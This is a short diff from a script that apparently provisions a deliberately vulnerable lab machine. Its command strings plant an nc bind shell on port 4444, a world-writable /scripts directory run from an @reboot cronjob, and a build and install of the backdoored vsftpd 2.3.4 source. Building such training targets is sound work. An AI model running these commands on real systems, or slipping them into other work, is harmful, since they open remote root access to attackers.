@@ -18,7 +18,7 @@ cronjob2 = 'echo "@reboot sleep 10 && bash /scripts/maintainer.sh > dev/null 2>&
 # remember to add extra cronjobs for different machines
 wwscript = 'mkdir /scripts && echo "oh no dont edit this world writable script to do bad things ohh nooo" >> /scripts/rootcron.sh && chmod -R 777 /scripts'
 bindshell = 'echo "#! /bin/sh" >> maintainer.sh && echo "/usr/bin/nc -lvp 4444 -e /bin/sh" >> maintainer.sh'
-vsftpd = 'sed -i "s/LINK	=	-Wl,-s/LINK	=	-Wl,-s,-crypt" vsftpd-2.3.4-infected/Makefile && make && useradd nobody && mkdir /usr/share/empty && sudo cp vsftpd /usr/local/sbin/vsftpd && sudo cp vsftpd.8 /usr/local/man/man8 && sudo cp vsftpd.conf.5 /usr/local/man/man5 && sudo cp vsftpd.conf /etc && mkdir /var/ftp/ && useradd -d /var/ftp ftp && chown root:root /var/ftp && chmod og-w /var/ftp && sed -i "s/#local_enable=YES/local_enable=YES" /etc/vsftpd.conf'
+vsftpd = 'sed -i "s/LINK	=	-Wl,-s/LINK	=	-Wl,-s,-crypt/" vsftpd-2.3.4-infected/Makefile && make && useradd nobody && mkdir /usr/share/empty && sudo cp vsftpd /usr/local/sbin/vsftpd && sudo cp vsftpd.8 /usr/local/man/man8 && sudo cp vsftpd.conf.5 /usr/local/man/man5 && sudo cp vsftpd.conf /etc && mkdir /var/ftp/ && useradd -d /var/ftp ftp && chown root:root /var/ftp && chmod og-w /var/ftp && sed -i "s/#local_enable=YES/local_enable=YES" /etc/vsftpd.conf'
 
 #sudoers =''
 
